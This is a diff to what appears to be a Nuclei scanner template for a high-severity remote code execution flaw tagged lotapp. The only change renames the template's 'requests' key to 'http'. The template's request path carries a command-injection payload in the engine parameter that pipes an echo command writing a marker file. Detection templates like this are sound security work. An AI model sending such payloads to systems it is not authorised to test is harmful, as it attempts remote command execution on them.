@@ -6,7 +6,7 @@ info:
   severity: high
   tags: lotapp,rce
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/acc/debug/bytecache_run_action.php?action=1&engine=test%27|echo%2054dhnbd545845fvbgdtgfn>1.txt||%27a"
